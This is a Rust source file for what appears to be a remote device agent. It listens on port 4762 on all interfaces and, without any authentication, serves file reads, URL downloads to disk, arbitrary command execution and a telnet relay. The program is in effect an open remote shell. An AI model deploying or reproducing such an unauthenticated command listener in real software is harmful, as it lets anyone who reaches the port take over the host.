use std::env;
use std::error::Error;
use std::fs;
use std::fs::DirEntry;
use std::io::Read;
use std::io::Write;
use std::net::TcpListener;
use std::net::TcpStream;
use std::path::Path;
use std::process::Command;
use std::time::Duration;

use gsm_agent::ThreadPool;
use telnet::Event;
use telnet::Telnet;

fn main() {
    let listener = TcpListener::bind("0.0.0.0:4762").unwrap();
    let pool = ThreadPool::new(4);
    for stream in listener.incoming() {
        match stream {
            Ok(s) => pool.execute(|| {
                handle_connection(s);
            }),
            Err(e) => println!("invalid stream: {:?}\n", e),
        }
    }
}

fn cat(path: &str) -> String {
    let path = Path::new(path);
    String::from_utf8(fs::read(path).unwrap()).unwrap()
}

fn cd(destination: &str) -> Result<String, std::io::Error> {
    // TODO: Change path per-worker instead of globally
    let path = Path::new(destination);
    match env::set_current_dir(path) {
        Ok(_) => Ok(pwd()),
        Err(e) => Err(e),
    }
}

fn get(url: &str, destination: &str) -> Result<(), Box<dyn Error>> {
    let response = minreq::get(url).send()?;
    let path = Path::new(destination);
    match fs::write(path, response.as_bytes()) {
        Ok(_) => Ok(()),
        Err(e) => Err(Box::new(e)),
    }
}

fn ls(path: &str) -> String {
    let mut files: Vec<String> = Vec::new();
    let mut paths: Vec<DirEntry> = fs::read_dir(path).unwrap().map(|r| r.unwrap()).collect();
    paths.sort_by(|a, b| a.file_name().cmp(&b.file_name()));
    for file in paths {
        files.push(file.file_name().into_string().unwrap());
    }
    files.join("\n")
}

fn pwd() -> String {
    env::current_dir().unwrap().to_string_lossy().to_string()
}

fn shell<'a, T>(command: &str, args: T) -> String
where
    T: Iterator<Item = &'a str>,
{
    String::from_utf8(Command::new(command).args(args).output().unwrap().stdout).unwrap()
}

fn telnet(stream: &mut TcpStream, host: &str, port: &u16) -> Result<String, std::io::Error> {
    let mut telnet = Telnet::connect((host, *port), 4096)?;
    let mut stream_buffer = [0; 4096];
    stream.set_read_timeout(Some(Duration::new(1, 0)))?;
    'main: loop {
        match stream.read(&mut stream_buffer) {
            Ok(read) => {
                match String::from_utf8_lossy(&stream_buffer[0..read])
                    .as_ref()
                    .trim()
                {
                    "quit" => break 'main,
                    _ => telnet.write(&stream_buffer[0..read]).unwrap(),
                };
            }
            Err(_) => {}
        };
        match telnet.read_timeout(Duration::new(1, 0)) {
            Ok(event) => {
                if let Event::Data(buffer) = event {
                    stream.write(&buffer).unwrap();
                }
            }
            Err(e) => {
                println!("telnet read error: {:?}\n", e);
                break 'main;
            }
        }
    }
    Ok(String::from("Telnet connection closed"))
}

fn handle_connection(mut stream: TcpStream) {
    loop {
        let mut buffer = [0; 1024];
        stream
            .read(&mut buffer)
            .expect("Failed to read from socket");
        let mut request: &str =
            &String::from_utf8(buffer.to_vec()).expect("Failed to convert command to string");
        request = request.trim();
        let trim_chars = [' ', '\r', '\n', '\0'];
        request = request.trim_matches(&trim_chars[..]);
        let mut command_iter = request.split_whitespace();
        match command_iter.next() {
            Some(command) => {
                let response: String = match command {
                    "cat" => cat(command_iter.next().unwrap()),
                    "cd" => match cd(command_iter.next().unwrap()) {
                        Ok(s) => s.to_string(),
                        Err(e) => e.to_string(),
                    },
                    "get" => {
                        match get(command_iter.next().unwrap(), command_iter.next().unwrap()) {
                            Ok(_) => String::new(),
                            Err(e) => (*e).to_string(),
                        }
                    }
                    "ls" => {
                        let path = match command_iter.next() {
                            Some(s) => s.to_string(),
                            None => pwd(),
                        };
                        ls(path.as_ref())
                    }
                    "ping" => String::from("pong"),
                    "pwd" => pwd(),
                    "shell" => shell(command_iter.next().unwrap(), command_iter),
                    "telnet" => {
                        let host = command_iter.next().unwrap();
                        let port = u16::from_str_radix(command_iter.next().unwrap(), 10).unwrap();
                        match telnet(&mut stream, host, &port) {
                            Ok(s) => s,
                            Err(e) => e.to_string(),
                        }
                    }
                    _ => {
                        format!(
                            "unknown command: {:?}",
                            request.split_whitespace().next().unwrap_or("")
                        )
                    }
                };
                stream.write(format!("{}\n", response).as_bytes()).unwrap();
                stream.flush().unwrap();
            }
            None => {
                return;
            }
        }
    }
}
